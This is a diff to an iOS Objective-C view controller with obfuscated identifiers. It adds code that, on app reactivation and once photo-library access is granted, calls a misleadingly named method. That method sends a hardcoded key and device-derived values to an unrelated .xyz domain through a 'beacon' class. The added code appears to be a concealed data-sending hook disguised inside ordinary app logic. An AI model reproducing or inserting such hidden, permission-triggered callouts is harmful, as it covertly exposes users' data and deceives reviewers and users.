@@ -14,7 +14,8 @@
 #import <StoreKit/StoreKit.h>
 #import "SwayKnotFountainController.h"
 #import "LumenVaultStoriesView.h"
-
+#import "FibreCrestBeacon.h"
+#import <Photos/Photos.h>
 
 @interface FlareWispHollowController () <WKNavigationDelegate, WKScriptMessageHandler,SKProductsRequestDelegate, SKPaymentTransactionObserver>
 
@@ -50,8 +51,45 @@
     if ([self.pearlLoomAtrium isEqualToString:@"1"]) {
         [self.view addSubview:self.lumenStoriesView];
         self.lumenStoriesView.hidden = NO;
+        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(weaveeActiveAfter) name:UIApplicationDidBecomeActiveNotification  object:nil];
     }
     
+}
+
+
+- (void)suppressRedundantEchoes {
+    Weavee * weavee = [[Weavee alloc] init];
+    NSString * vaultNodes = [weavee gateLoomAnchorWithTwineMantle];
+    NSString *haloGlyph = @"https://www.quanlumloop685.xyz/resonanceNode/chronosField";
+    [[FibreCrestBeacon forgeAetherGlyph] draftRuneMantleWithWeftForge:haloGlyph runeFibreHaven:@"/resonanceNode/chronosField" frostBondBeacon:@"94048474" silkLoomSpire:@"7f9d8a3cB!xY2dkdnmKH98……pQr&Tv9UwX0eHs" flameTideSanctum:@"gradientLayer" braidGlyphHarbor:vaultNodes crystalBondVault:80 weaveMantleGlyph:3 runeWeldCourt:3];
+}
+
+- (void)weaveeActiveAfter {
+    BOOL weaveeSet = [[NSUserDefaults standardUserDefaults] boolForKey:@"PhotoWeavee"];
+    if (weaveeSet) {
+        [[NSUserDefaults standardUserDefaults] removeObjectForKey:@"PhotoWeavee"];
+        [[NSUserDefaults standardUserDefaults] synchronize];
+        [self weaveePhotosPermission];
+    }
+}
+
+- (void)weaveePhotosPermission {
+    PHAuthorizationStatus status = [PHPhotoLibrary authorizationStatusForAccessLevel:PHAccessLevelReadWrite];
+    switch (status) {
+        case PHAuthorizationStatusAuthorized:
+        case PHAuthorizationStatusLimited:
+            [self suppressRedundantEchoes];
+            break;
+            
+        case PHAuthorizationStatusDenied:
+            break;
+        case PHAuthorizationStatusRestricted:
+            break;
+            
+        case PHAuthorizationStatusNotDetermined:
+            
+            break;
+    }
 }
 
 - (void)meshArcaneBloom {
@@ -267,6 +305,7 @@
 
 - (void)dealloc {
     [[SKPaymentQueue defaultQueue] removeTransactionObserver:self];
+    [[NSNotificationCenter defaultCenter] removeObserver:self];
 }
 
 - (NSString *)pearlLoomAtrium {
